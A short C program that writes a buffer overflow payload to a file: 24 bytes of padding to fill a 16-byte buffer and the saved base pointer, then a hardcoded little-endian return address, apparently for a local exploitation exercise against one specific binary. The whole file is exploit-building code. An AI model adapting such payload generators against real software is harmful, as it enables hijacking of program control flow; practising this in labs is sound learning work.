#include <stdio.h>

int main() {
    FILE *f = fopen("payload.txt", "wb");
    if (!f) return 1;

    // 16 bytes (buffer) + 8 bytes (RBP) = 24 bytes of junk
    for (int i = 0; i < 24; i++) fputc('A', f);

    // Addresû 0x0000000140001450 Little-endian
    unsigned char addr[] = {0x50, 0x14, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00};
    fwrite(addr, 1, 8, f);

    fclose(f);
    printf("Payload.txt updated with address 0x140001450!\n");
    return 0;
}
